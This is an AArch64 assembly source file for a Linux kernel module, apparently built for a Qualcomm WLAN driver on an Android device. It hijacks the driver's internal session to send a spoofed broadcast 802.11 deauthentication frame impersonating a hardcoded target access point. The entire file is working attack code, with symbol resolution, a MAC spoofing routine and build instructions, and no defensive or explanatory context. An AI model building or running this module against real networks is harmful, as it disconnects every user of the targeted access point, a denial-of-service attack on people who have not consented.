/*
 * petx4.S - Spoofed deauth via lim_send_deauth_mgmt_frame
 *
 * When loaded while connected to target AP:
 * 1. Gets PE session (bssId=target already since we're connected to target)
 * 2. Saves selfMacAddr at session+0xC6
 * 3. Overwrites selfMacAddr with target AP BSSID
 *    So SA=BSSID=target AP, DA=broadcast
 * 4. Calls lim_send_deauth_mgmt_frame(mac_ctx, 7, bcast, session, false)
 * 5. Restores selfMacAddr
 *
 * Result: OTA deauth with SA=BSSID=04:67:61:d6:dc:92, DA=broadcast
 *
 * Build: as -o petx4.o petx4.S && ld -r -o petx4.ko petx4.o
 */

.section .gnu.linkonce.this_module, "aw"
.balign 256
__this_module:
    .fill 24, 1, 0
    .asciz "kfind"
    .fill 50, 1, 0
    .fill 256, 1, 0
    .quad init_module
    .fill 440, 1, 0
    .quad cleanup_module
    .fill 40, 1, 0

.section .modinfo, "a"
    .asciz "vermagic=4.19.81-perf+ SMP preempt mod_unload modversions aarch64"
    .asciz "name=kfind"
    .asciz "license=GPL"

.section __versions, "a"
    .quad 0
    .asciz "module_layout"
    .balign 64, 0
    .quad 0
    .asciz "printk"
    .balign 64, 0
    .quad 0
    .asciz "kallsyms_lookup_name"
    .balign 64, 0

.section .rodata, "a"
str_cds:        .asciz "cds_get_context"
str_pe_find:    .asciz "pe_find_session_by_session_id"
str_lim_deauth: .asciz "lim_send_deauth_mgmt_frame"

fmt_init:    .asciz "petx4: spoofed deauth TX\n"
fmt_sess:    .asciz "petx4: session=%px bssid=%02x:%02x:%02x:%02x:%02x:%02x\n"
fmt_selfmac: .asciz "petx4: selfMac saved: %02x:%02x:%02x:%02x:%02x:%02x\n"
fmt_spoof:   .asciz "petx4: selfMac spoofed to target AP BSSID\n"
fmt_call:    .asciz "petx4: calling lim_send_deauth_mgmt_frame...\n"
fmt_restored:.asciz "petx4: selfMac restored\n"
fmt_err:     .asciz "petx4: ERROR - no session or symbol\n"
fmt_done:    .asciz "petx4: done\n"
fmt_nosess:  .asciz "petx4: trying session %d...\n"

/* Target AP BSSID */
.balign 8
target_bssid:
    .byte 0x04,0x67,0x61,0xd6,0xdc,0x92
    .byte 0,0

/* Broadcast */
.balign 8
bcast_mac:
    .byte 0xff,0xff,0xff,0xff,0xff,0xff
    .byte 0,0

.equ SELFMAC_OFF, 0xC6
.equ BSSID_OFF, 0xC0

.section .init.text, "ax"
.globl init_module
.type init_module, %function
init_module:
    stp x29, x30, [sp, #-96]!
    mov x29, sp
    stp x19, x20, [sp, #16]
    stp x21, x22, [sp, #32]
    stp x23, x24, [sp, #48]
    stp x25, x26, [sp, #64]
    stp x27, x28, [sp, #80]

    adrp x0, fmt_init
    add x0, x0, :lo12:fmt_init
    bl printk

    /* Resolve symbols */
    adrp x0, str_cds
    add x0, x0, :lo12:str_cds
    bl kallsyms_lookup_name
    cbz x0, .Lerr
    mov x19, x0                /* x19 = cds_get_context */

    adrp x0, str_pe_find
    add x0, x0, :lo12:str_pe_find
    bl kallsyms_lookup_name
    cbz x0, .Lerr
    mov x20, x0                /* x20 = pe_find_session_by_session_id */

    adrp x0, str_lim_deauth
    add x0, x0, :lo12:str_lim_deauth
    bl kallsyms_lookup_name
    cbz x0, .Lerr
    mov x21, x0                /* x21 = lim_send_deauth_mgmt_frame */

    /* Get mac_ctx */
    mov w0, #53
    blr x19
    cbz x0, .Lerr
    mov x22, x0                /* x22 = mac_ctx */

    /* Find PE session - try IDs 0-3 */
    mov w23, #0                /* x23 will be session when found */
    mov w28, #0                /* session ID counter */

.Lfind_session:
    cmp w28, #4
    b.ge .Lerr

    adrp x0, fmt_nosess
    add x0, x0, :lo12:fmt_nosess
    mov w1, w28
    bl printk

    mov x0, x22
    mov w1, w28
    blr x20
    cbnz x0, .Lgot_session
    add w28, w28, #1
    b .Lfind_session

.Lgot_session:
    mov x23, x0                /* x23 = session */

    /* Print session + bssId for verification */
    add x8, x23, #BSSID_OFF
    adrp x0, fmt_sess
    add x0, x0, :lo12:fmt_sess
    mov x1, x23
    ldrb w2, [x8, #0]
    ldrb w3, [x8, #1]
    ldrb w4, [x8, #2]
    ldrb w5, [x8, #3]
    ldrb w6, [x8, #4]
    ldrb w7, [x8, #5]
    bl printk

    /* ===== Save original selfMacAddr (6 bytes at +0xC6) ===== */
    add x8, x23, #SELFMAC_OFF
    ldr w24, [x8]              /* x24 = first 4 bytes of selfMacAddr */
    ldrh w25, [x8, #4]        /* x25 = last 2 bytes of selfMacAddr */

    /* Print saved MAC */
    add x8, x23, #SELFMAC_OFF
    adrp x0, fmt_selfmac
    add x0, x0, :lo12:fmt_selfmac
    ldrb w1, [x8, #0]
    ldrb w2, [x8, #1]
    ldrb w3, [x8, #2]
    ldrb w4, [x8, #3]
    ldrb w5, [x8, #4]
    ldrb w6, [x8, #5]
    bl printk

    /* ===== Overwrite selfMacAddr with target BSSID ===== */
    adrp x26, target_bssid
    add x26, x26, :lo12:target_bssid
    add x8, x23, #SELFMAC_OFF
    ldr w9, [x26]
    str w9, [x8]               /* copy first 4 bytes */
    ldrh w9, [x26, #4]
    strh w9, [x8, #4]         /* copy last 2 bytes */

    adrp x0, fmt_spoof
    add x0, x0, :lo12:fmt_spoof
    bl printk

    /* ===== Call lim_send_deauth_mgmt_frame ===== */
    /*
     * void lim_send_deauth_mgmt_frame(
     *     tpAniSirGlobal mac_ctx,    // x0
     *     uint16_t nReason,          // x1 (w1)
     *     tSirMacAddr peer,          // x2 (pointer to 6-byte MAC)
     *     tpPESession session,       // x3
     *     bool waitForAck)           // x4 (w4)
     */
    adrp x0, fmt_call
    add x0, x0, :lo12:fmt_call
    bl printk

    mov x0, x22                /* mac_ctx */
    mov w1, #7                 /* reason: Class 3 frame */
    adrp x2, bcast_mac
    add x2, x2, :lo12:bcast_mac  /* peer = broadcast */
    mov x3, x23                /* session */
    mov w4, #0                 /* waitForAck = false */
    blr x21                   /* lim_send_deauth_mgmt_frame */

    /* ===== Restore selfMacAddr ===== */
    add x8, x23, #SELFMAC_OFF
    str w24, [x8]              /* restore first 4 bytes */
    strh w25, [x8, #4]        /* restore last 2 bytes */

    adrp x0, fmt_restored
    add x0, x0, :lo12:fmt_restored
    bl printk

    adrp x0, fmt_done
    add x0, x0, :lo12:fmt_done
    bl printk
    mov w0, #0
    b .Lret

.Lerr:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    bl printk
    mov w0, #-1

.Lret:
    ldp x27, x28, [sp, #80]
    ldp x25, x26, [sp, #64]
    ldp x23, x24, [sp, #48]
    ldp x21, x22, [sp, #32]
    ldp x19, x20, [sp, #16]
    ldp x29, x30, [sp], #96
    ret

.section .exit.text, "ax"
.globl cleanup_module
.type cleanup_module, %function
cleanup_module:
    ret

.section .note.Linux, "a", @note
    .long 6
    .long 0
    .long 0x100
    .asciz "Linux"
    .balign 4

.section .plt, "ax"
    .balign 8
    .space 8

.section .init.plt, "ax"
    .balign 8
    .space 8

.section .text.ftrace_trampoline, "ax"
    .balign 8
    .space 8
